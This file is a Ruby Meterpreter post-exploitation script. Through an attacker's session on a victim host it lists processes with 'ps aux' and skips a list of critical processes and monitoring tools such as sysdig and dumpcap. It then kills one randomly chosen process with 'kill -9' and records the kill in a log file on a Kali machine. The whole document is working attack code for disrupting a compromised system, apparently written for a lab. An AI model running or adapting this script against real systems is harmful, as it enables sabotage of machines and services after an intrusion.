# Meterpreter script to list processes, check and kill one randomly

# List of critical processes or keywords to avoid killing
critical_processes = [
    'meterpreter', 'sshd', 'systemd', 'init', 'Xorg', 'kernel',
    'kworker', 'dbus', 'udevd', 'apache2', 'nginx', 'sysdig', 'psimon', 'dumpcap', 'xfsettingsd', '/usr/bin/VBoxClient', './receiver.sh', '/usr/sbin/lightdm', '/usr/bin/zsh', './victim.sh', '/usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch', '/usr/bin/qterminal', 'xfce4-session', 'lightdm --session-child 12 24', '/usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch'
].map(&:downcase)  # Ensure all critical processes are in lowercase

# Execute the ps aux command to list all processes
output = cmd_exec('ps aux')

# Split the output into lines (each line is a process)
processes = output.split("\n")

# Remove the header line (ps aux header)
processes.shift

# Filter processes to avoid critical ones and Meterpreter
safe_processes = processes.reject do |process|
  process_downcase = process.downcase
  critical_processes.any? { |keyword| process_downcase.include?(keyword) }
end

# If there are no safe processes left, exit the script
if safe_processes.empty?
  puts "No safe processes available to kill."
  exit
end

# Select a random process from the safe list
random_process = safe_processes.sample
puts "Selected process to kill: #{random_process}"

# Extract the PID (the second field in the output)
pid = random_process.split[1]

# Log the killed process to a log file (append mode)
log_file = "/home/kali/meterpreter/kill.log"  # Replace with your desired log file path
File.open(log_file, "a") do |file|
  file.puts("#{Time.now} - Killed process: #{random_process.strip} (PID: #{pid})")
end

# Kill the selected process
cmd_exec("kill -9 #{pid}")

# Print the selected process and confirmation message
puts "Process with PID #{pid} has been killed."
